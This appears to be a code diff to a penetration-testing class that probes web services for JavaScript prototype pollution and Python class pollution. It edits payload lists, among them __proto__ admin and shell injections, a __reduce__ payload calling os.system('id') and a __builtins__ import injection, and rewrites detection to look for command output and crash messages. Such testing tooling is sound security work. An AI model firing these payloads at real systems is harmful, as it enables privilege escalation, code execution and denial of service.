@@ -8,18 +8,20 @@ class SchemaPollutionTest:
     def __init__(self, pentester):
         self.pentester = pentester
     
-    # JavaScript prototype pollution
+    # JavaScript prototype pollution (DoS-focused for reliable detection)
     PROTO_PAYLOADS = [
-        {"__proto__": {"admin": True}},
+        {"__proto__": {"toString": "polluted"}},  # Triggers TypeError on string coercion
+        {"__proto__": {"valueOf": "polluted"}},   # Triggers TypeError on value coercion
         {"constructor": {"prototype": {"isAdmin": True}}},
         {"__proto__": {"shell": "/bin/sh", "env": {"PATH": "/tmp"}}},
     ]
     
-    # Python class pollution
+    # Python class pollution (Note: __reduce__ only works with pickle/yaml, not JSON)
     PYTHON_PAYLOADS = [
         {"__class__": {"__init__": {"__globals__": {"admin": True}}}},
-        {"__reduce__": ["os.system", ["id"]]},
+        {"__reduce__": ["os.system", ["id"]]},  # Pickle/YAML only
         {"__dict__": {"_admin": True}},
+        {"__builtins__": {"__import__": "os"}},
     ]
     
     # Generic injection into nested structures
@@ -95,25 +97,28 @@ class SchemaPollutionTest:
         return findings
     
     def _detect_pollution(self, content, payload):
-        """Detect pollution via response analysis"""
-        # Check for RCE indicators (from Python payloads)
+        """Detect pollution via behavioral indicators, not reflection"""
+        # 1. Check if semantic detector found RCE/file read
         if self.pentester.detector.findings:
             return True
         
-        # Check for error messages indicating pollution attempt was processed
-        pollution_indicators = [
-            '__proto__',
-            'prototype',
-            '__class__',
-            '__init__',
-            '__globals__',
-            'constructor',
-            'Object.prototype',
-        ]
+        # 2. Check for RCE command output (uid= from 'id' command)
+        if "uid=" in content and "gid=" in content:
+            return True
         
-        # Look for reflection of pollution keys in response
-        for key in pollution_indicators:
-            if key in str(payload) and key in content:
-                return True
+        # 3. Check for DoS/crash indicators (toString/valueOf pollution)
+        crash_indicators = [
+            "Maximum call stack size exceeded",
+            "Cannot convert object to primitive value",
+            "TypeError: Cannot read property",
+            "TypeError: this.toString is not a function",
+            "Recursive process.env",
+            "RangeError: Maximum call stack",
+        ]
+        if any(indicator in content for indicator in crash_indicators):
+            return True
+        
+        # 4. REMOVED: Reflection checks (high false positive rate)
+        # Do NOT flag just because the server echoes back invalid input
         
         return False
